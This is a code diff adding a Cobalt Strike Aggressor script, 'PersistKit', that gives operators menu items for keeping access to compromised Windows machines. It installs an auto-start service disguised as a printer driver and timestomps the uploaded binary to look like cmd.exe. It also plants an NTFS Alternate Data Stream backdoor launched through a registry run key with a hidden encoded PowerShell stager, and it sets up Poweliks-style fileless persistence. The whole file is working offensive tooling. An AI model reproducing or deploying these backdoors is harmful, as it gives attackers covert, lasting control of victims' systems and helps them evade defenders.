@@ -1,0 +1,121 @@
+# Actions in this kit center around endpoint persistence. Examples include backdoor service creation, backdoor process creation, etc
+# @Und3rf10w
+
+# Used for "Create Backdoor Service" action
+sub servicefilename {
+	$servicebackdoorfilename = matches($1, '[\/](\w+\.\w+)$');
+	$servicebackdoorfilename = $servicebackdoorfilename[0];
+	return $servicebackdoorfilename;
+}
+
+# Menu-driven operation to create an NTFS Alternate Data Stream backdoor that
+# 	autoruns on boot. Does NOT require admin
+sub createADSBackdoor {
+	$bid = $1;
+	$selectedListener = $2;
+	getADSRegName();
+	bpowershell_import($bid, script_resource("PersistKit/scripts/Invoke-ADSBackdoor.ps1"));
+	prompt_text("Location of file/folder to give ADS (it must exist!)?", "%APPDATA%\\Temp\\somefile.txt", {
+		# Encode shellcode for the stager
+		$psPayload = powershell_encode_stager(shellcode($selectedListener));
+		$fullPsPayload = "powershell.exe -nop -w hidden -encodedcommand $psPayload";
+		binput($bid, "powershell-import Invoke-ADSBackdoor.ps1");
+		# $bid is actually an array, so use $bid[0] for -isadmin
+		# Admitettly hacky way to avoid using lambda
+		if (-isadmin $bid[0]){
+			blog($bid, "Beacon is admin, using HKLM hive, \Ubackdoor will execute for any user\U");
+			binput($bid, "powershell Invoke-ADSBackdoor -RegKeyName \" $+ $theADSRegName $+ \" -backdoored_file_path $1 -cobaltstrike_gen_payload \" $+ $fullPsPayload $+ \" -admin");
+			bpowershell($bid, "Invoke-ADSBackdoor -RegKeyName \" $+ $theADSRegName $+ \" -backdoored_file_path \" $+ $1 $+ \" -cobaltstrike_gen_payload \" $+ $fullPsPayload $+ \" -admin");
+		} else {
+			blog($bid, "Beacon is not admin, using HKCU hive, \Ubackdoor will only execute for this user\U");
+			binput($bid, "powershell Invoke-ADSBackdoor -RegKeyName \" $+ $theADSRegName $+ \" -backdoored_file_path $1 -cobaltstrike_gen_payload \" $+ $fullPsPayload $+ \"");
+			bpowershell($bid, "Invoke-ADSBackdoor -RegKeyName \" $+ $theADSRegName $+ \" -backdoored_file_path \" $+ $1 $+ \" -cobaltstrike_gen_payload \" $+ $fullPsPayload $+ \"");
+		}
+	});
+}
+
+sub createFilelessBackdoor{
+	$bid = $1;
+	$selectedListener = $2;
+	openOrActivate($bid);
+	$psPayload = powershell_encode_stager(shellcode($selectedListener));
+	binput($bid, "powershell-import Persist-Poweliks.ps1");
+	bpowershell_import($bid, script_resource("PersistKit/scripts/Persist-Poweliks.ps1"));
+	binput($bid, "powershell Persist-Poweliks");
+	bpowershell($bid, "Persist-Poweliks -cobaltstrike_gen_payload \" $+ $psPayload $+ \"");
+}
+
+# Returns a string to use for the reg key name
+sub getADSRegName {
+	prompt_text("Registry key name you'd like to use?", "Update", {
+		$theADSRegName = $1;
+	});
+	return $theADSRegName;
+}
+
+popup beacon_bottom {
+	menu "PersistKit" {
+		item "Create Backdoor Service"{
+			local ('$bid');
+			# TODO:
+			#	* build out a proper Java Swing menu to customize the options
+			foreach $bid ($1){
+				prompt_file_open("Select the service exe to use", $null, false, {
+					blog($bid, "\c4Uploading backdoor on beacon $1 using file $2");
+					blog($bid, "Attempting to publish backdoor service");
+					bcd($bid, "C:\\Windows\\");
+					blog($bid, "\c4Changed directory on beacon $1 to C:\\Windows\\");
+					bupload($bid, $2);
+					servicefilename($2);
+					btimestomp($bid, "$servicebackdoorfilename", "C:\\Windows\\system32\\cmd.exe")
+					prompt_text("Name of service to use?", "GenericPrinterDriver", {
+						$serviceName = $1;
+					});
+					prompt_text("Service Display Name to use?", "Generic Printer Driver Support", {
+						$serviceDisplayName = $1;
+					});
+					bshell($bid, "sc create $serviceName binPath= \"C:\\Windows\\ $+ $servicebackdoorfilename $+ \" start= auto DisplayName= \" $serviceDisplayName \"");
+					bshell($bid, "sc start $serviceName ");
+					blog($bid, "Backdoor service created using $servicebackdoorfilename ");
+					blog($bid, "\c9[+] Backdoor creation complete!");
+				});
+			}
+		}
+		item "Create NTFS ADS Backdoor"{
+				local ('$bid');
+				# Open a payload selection dialoge, passes it to createADSBackdoor()
+				# TODO:
+				#	* build out a proper Java Swing menu to customize the options
+				#	* Modify the powershell script to determine which key to write to HKLM || HKCU
+				foreach $bid ($1){
+					openPayloadHelper(lambda({
+					createADSBackdoor($bid, $1);
+				}, $bid => $1));
+			}
+		}
+		menu "Fileless backdoor" {
+			item "Create fileless backdoor"{
+				local('$bid');
+				foreach $bid ($1){
+					openPayloadHelper(lambda({
+						createFilelessBackdoor($bid, $1);
+						}, $bid => $1));
+				}
+			}
+			item "Check for fileless backdoor"{
+				local('$bid');
+				foreach $bid ($1){
+					bpowershell_import($bid, script_resource("PersistKit/scripts/Persist-Poweliks.ps1"));
+					bpowershell($bid, "Test-Poweliks");
+				}
+			}
+			item "Remove fileless backdoor"{
+				local('$bid');
+				foreach $bid ($1){
+					bpowershell_import($bid, script_resource("PersistKit/scripts/Persist-Poweliks.ps1"));
+					bpowershell($bid, "Remove-Poweliks");
+				}
+			}
+		}
+	}
+}
